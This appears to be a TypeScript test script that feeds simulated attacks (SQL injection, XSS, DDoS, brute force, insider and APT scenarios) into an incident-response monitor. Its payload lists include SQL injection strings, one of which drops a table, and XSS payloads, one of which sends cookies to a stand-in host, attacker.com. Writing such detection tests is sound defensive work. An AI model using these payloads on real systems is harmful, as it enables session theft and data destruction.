#!/usr/bin/env ts-node

import { IncidentResponseAutomation } from "./incident-response-automation"
import { securityMonitor, SecurityEventType, SecuritySeverity } from "../lib/security-monitor"

class SpecificIncidentTester {
  private automation: IncidentResponseAutomation

  constructor() {
    this.automation = new IncidentResponseAutomation()
  }

  async testAdvancedSQLInjection(): Promise<void> {
    console.log("🧪 Testing Advanced SQL Injection Scenarios")
    console.log("=".repeat(50))

    const scenarios = [
      {
        name: "Union-based SQL Injection",
        payload: "' UNION SELECT username, password FROM users--",
        endpoint: "/api/search",
        parameter: "query",
      },
      {
        name: "Time-based Blind SQL Injection",
        payload: "'; WAITFOR DELAY '00:00:05'--",
        endpoint: "/api/products",
        parameter: "id",
      },
      {
        name: "Boolean-based Blind SQL Injection",
        payload: "' AND 1=1--",
        endpoint: "/api/users",
        parameter: "username",
      },
      {
        name: "Second-order SQL Injection",
        payload: "admin'; DROP TABLE sessions; --",
        endpoint: "/api/profile/update",
        parameter: "displayName",
      },
    ]

    for (const scenario of scenarios) {
      console.log(`\n🔍 Testing: ${scenario.name}`)

      await securityMonitor.logSecurityEvent({
        type: SecurityEventType.SQL_INJECTION_ATTEMPT,
        severity: SecuritySeverity.CRITICAL,
        source: scenario.endpoint,
        ip: `192.168.1.${Math.floor(Math.random() * 255)}`,
        details: {
          injectionType: scenario.name,
          payload: scenario.payload,
          parameter: scenario.parameter,
          endpoint: scenario.endpoint,
          detectionMethod: "pattern_matching",
        },
      })

      const incidentId = await this.automation.handleSecurityIncident("sql_injection_attempt", "critical", {
        ip: `192.168.1.${Math.floor(Math.random() * 255)}`,
        endpoint: scenario.endpoint,
        payload: scenario.payload,
        parameter: scenario.parameter,
        injectionType: scenario.name,
      })

      console.log(`  ✅ Handled incident: ${incidentId}`)
    }
  }

  async testXSSVariants(): Promise<void> {
    console.log("\n🧪 Testing XSS Attack Variants")
    console.log("=".repeat(50))

    const xssPayloads = [
      {
        name: "Stored XSS",
        payload: '<script>document.location="http://attacker.com/steal.php?cookie="+document.cookie</script>',
        endpoint: "/api/comments",
        persistent: true,
      },
      {
        name: "Reflected XSS",
        payload: '<img src=x onerror=alert("XSS")>',
        endpoint: "/search",
        persistent: false,
      },
      {
        name: "DOM-based XSS",
        payload: 'javascript:alert("XSS")',
        endpoint: "/redirect",
        persistent: false,
      },
      {
        name: "Filter Evasion XSS",
        payload: '<svg/onload=alert("XSS")>',
        endpoint: "/api/posts",
        persistent: true,
      },
    ]

    for (const xss of xssPayloads) {
      console.log(`\n🔍 Testing: ${xss.name}`)

      await securityMonitor.logSecurityEvent({
        type: SecurityEventType.XSS_ATTEMPT,
        severity: SecuritySeverity.CRITICAL,
        source: xss.endpoint,
        ip: `10.0.0.${Math.floor(Math.random() * 255)}`,
        details: {
          xssType: xss.name,
          payload: xss.payload,
          endpoint: xss.endpoint,
          persistent: xss.persistent,
          detectionMethod: "content_analysis",
        },
      })

      const incidentId = await this.automation.handleSecurityIncident("xss_attempt", "critical", {
        ip: `10.0.0.${Math.floor(Math.random() * 255)}`,
        endpoint: xss.endpoint,
        payload: xss.payload,
        xssType: xss.name,
        persistent: xss.persistent,
      })

      console.log(`  ✅ Handled incident: ${incidentId}`)
    }
  }

  async testDistributedAttacks(): Promise<void> {
    console.log("\n🧪 Testing Distributed Attack Scenarios")
    console.log("=".repeat(50))

    // Simulate DDoS attack
    console.log("\n🌊 Simulating DDoS Attack...")
    const attackIPs = Array.from({ length: 50 }, (_, i) => `203.0.113.${i + 1}`)

    await securityMonitor.logSecurityEvent({
      type: SecurityEventType.RATE_LIMIT_EXCEEDED,
      severity: SecuritySeverity.CRITICAL,
      source: "/api/crypto/prices",
      details: {
        attackType: "DDoS",
        sourceIPs: attackIPs,
        requestsPerSecond: 10000,
        targetEndpoints: ["/api/crypto/prices", "/api/news", "/api/trades"],
        duration: 300, // 5 minutes
      },
    })

    // Simulate coordinated brute force
    console.log("\n🔓 Simulating Coordinated Brute Force...")
    const botnetIPs = Array.from({ length: 20 }, (_, i) => `198.51.100.${i + 1}`)

    for (const ip of botnetIPs.slice(0, 5)) {
      // Test with first 5 IPs
      await securityMonitor.logSecurityEvent({
        type: SecurityEventType.BRUTE_FORCE_ATTACK,
        severity: SecuritySeverity.CRITICAL,
        source: "/api/auth/signin",
        ip: ip,
        details: {
          attackType: "coordinated_brute_force",
          targetAccounts: ["admin", "root", "administrator"],
          botnetSize: botnetIPs.length,
          attackPattern: "distributed",
        },
      })
    }

    const incidentId = await this.automation.handleSecurityIncident("brute_force_attack", "critical", {
      ips: botnetIPs,
      accounts: ["admin", "root", "administrator"],
      attackType: "coordinated_brute_force",
      botnetSize: botnetIPs.length,
    })

    console.log(`  ✅ Handled distributed attack: ${incidentId}`)
  }

  async testInsiderThreats(): Promise<void> {
    console.log("\n🧪 Testing Insider Threat Scenarios")
    console.log("=".repeat(50))

    const insiderScenarios = [
      {
        name: "Privilege Escalation Attempt",
        userId: "employee_123",
        action: "unauthorized_admin_access",
        resource: "/admin/users/export",
      },
      {
        name: "Data Exfiltration",
        userId: "contractor_456",
        action: "bulk_data_download",
        resource: "/api/users/export",
      },
      {
        name: "System Manipulation",
        userId: "intern_789",
        action: "unauthorized_config_change",
        resource: "/admin/system/config",
      },
    ]

    for (const scenario of insiderScenarios) {
      console.log(`\n🔍 Testing: ${scenario.name}`)

      await securityMonitor.logSecurityEvent({
        type: SecurityEventType.UNAUTHORIZED_ACCESS,
        severity: SecuritySeverity.HIGH,
        source: scenario.resource,
        userId: scenario.userId,
        ip: "192.168.10.50", // Internal IP
        details: {
          threatType: "insider_threat",
          scenario: scenario.name,
          employeeId: scenario.userId,
          attemptedAction: scenario.action,
          resource: scenario.resource,
          accessTime: "after_hours",
        },
      })

      const incidentId = await this.automation.handleSecurityIncident("unauthorized_access", "high", {
        userId: scenario.userId,
        ip: "192.168.10.50",
        resource: scenario.resource,
        threatType: "insider_threat",
        scenario: scenario.name,
      })

      console.log(`  ✅ Handled insider threat: ${incidentId}`)
    }
  }

  async testAPTSimulation(): Promise<void> {
    console.log("\n🧪 Testing Advanced Persistent Threat (APT) Simulation")
    console.log("=".repeat(50))

    // Phase 1: Initial Compromise
    console.log("\n🎯 Phase 1: Initial Compromise")
    await securityMonitor.logSecurityEvent({
      type: SecurityEventType.SUSPICIOUS_LOGIN,
      severity: SecuritySeverity.HIGH,
      source: "/api/auth/signin",
      ip: "185.220.101.42", // Tor exit node
      userId: "target_user_001",
      details: {
        aptPhase: "initial_compromise",
        loginMethod: "credential_stuffing",
        vpnDetected: true,
        deviceFingerprint: "unknown",
      },
    })

    // Phase 2: Lateral Movement
    console.log("\n➡️ Phase 2: Lateral Movement")
    await securityMonitor.logSecurityEvent({
      type: SecurityEventType.UNAUTHORIZED_ACCESS,
      severity: SecuritySeverity.HIGH,
      source: "/api/admin/users",
      userId: "target_user_001",
      ip: "192.168.1.150", // Internal IP after compromise
      details: {
        aptPhase: "lateral_movement",
        escalationAttempt: true,
        accessedResources: ["/api/admin/users", "/api/system/logs", "/api/database/backup"],
      },
    })

    // Phase 3: Data Exfiltration
    console.log("\n📤 Phase 3: Data Exfiltration")
    await securityMonitor.logSecurityEvent({
      type: SecurityEventType.API_ABUSE,
      severity: SecuritySeverity.CRITICAL,
      source: "/api/users/export",
      userId: "target_user_001",
      ip: "192.168.1.150",
      details: {
        aptPhase: "data_exfiltration",
        dataVolume: "50GB",
        exportType: "bulk_user_data",
        compressionUsed: true,
        encryptionDetected: true,
      },
    })

    const incidentId = await this.automation.handleSecurityIncident("unauthorized_access", "critical", {
      userId: "target_user_001",
      ip: "192.168.1.150",
      threatType: "apt",
      phases: ["initial_compromise", "lateral_movement", "data_exfiltration"],
    })

    console.log(`  ✅ Handled APT simulation: ${incidentId}`)
  }

  async runAllSpecificTests(): Promise<void> {
    console.log("🚀 Starting Specific Security Incident Tests")
    console.log("=".repeat(60))

    try {
      await this.testAdvancedSQLInjection()
      await this.sleep(3000)

      await this.testXSSVariants()
      await this.sleep(3000)

      await this.testDistributedAttacks()
      await this.sleep(3000)

      await this.testInsiderThreats()
      await this.sleep(3000)

      await this.testAPTSimulation()

      console.log("\n" + "=".repeat(60))
      console.log("✅ All specific incident tests completed successfully!")
      console.log("=".repeat(60))
    } catch (error) {
      console.error("\n❌ Specific incident tests failed:", error)
      throw error
    }
  }

  private async sleep(ms: number): Promise<void> {
    return new Promise((resolve) => setTimeout(resolve, ms))
  }
}

// CLI interface
if (require.main === module) {
  const tester = new SpecificIncidentTester()

  const [, , testType] = process.argv

  if (testType === "sql") {
    tester.testAdvancedSQLInjection()
  } else if (testType === "xss") {
    tester.testXSSVariants()
  } else if (testType === "distributed") {
    tester.testDistributedAttacks()
  } else if (testType === "insider") {
    tester.testInsiderThreats()
  } else if (testType === "apt") {
    tester.testAPTSimulation()
  } else {
    tester.runAllSpecificTests()
  }
}

export { SpecificIncidentTester }
